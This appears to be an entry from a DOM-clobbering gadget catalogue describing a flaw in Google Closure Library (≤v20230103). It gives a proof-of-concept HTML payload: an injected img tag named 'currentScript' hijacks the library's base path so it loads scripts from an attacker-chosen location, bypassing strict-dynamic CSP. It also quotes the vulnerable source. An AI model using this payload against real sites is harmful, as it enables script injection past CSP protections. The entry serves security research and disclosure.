---
description: Closure Library is a powerful, low-level JavaScript library designed for building complex and scalable web applications. It is used by many Google web applications, such as Google Search, Gmail, Google Docs, Google+, Google Maps, and others.
github: google/closure-library
gadgets:
  ≤v20230103:
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - name-attr
      - src-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [Google Closure Library](https://github.com/google/closure-library) was using the `document.currentScript` property to load additional scripts.
        code: |
          <!-- user input -->
          <img name="currentScript" src="[current-location]/assets/xss/base.js">

          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/google-closure-library/20230103.0.0/base.js"></script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L2174">https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L2174</a>

      ```javascript
      // If we have a currentScript available, use it exclusively.
      var currentScript = doc.currentScript;
      if (currentScript) {
        var scripts = [currentScript];
      } else {
        var scripts = doc.getElementsByTagName('SCRIPT');
      }
      // Search backwards since the current script is in almost all cases the one
      // that has base.js.
      for (var i = scripts.length - 1; i >= 0; --i) {
        var script = /** @type {!HTMLScriptElement} */ (scripts[i]);
        var src = script.src;
        var qmark = src.lastIndexOf('?');
        var l = qmark == -1 ? src.length : qmark;
        if (src.slice(l - 7, l) == 'base.js') {
          goog.basePath = src.slice(0, l - 7);
          return;
        }
      }

      // [...]

      goog.DebugLoader_.prototype.loadClosureDeps = function() {
      // Circumvent addDependency, which would try to transpile deps.js if
      // transpile is set to always.
      var relPath = 'deps.js';
      this.depsToLoad_.push(this.factory_.createDependency(
          goog.normalizePath_(goog.basePath + relPath), relPath, [], [], {}));
      this.loadDeps_();
      };
      ```
    links:
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/google-closure-library.md
      - http://sebastian-lekies.de/slides/appsec2017.pdf
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
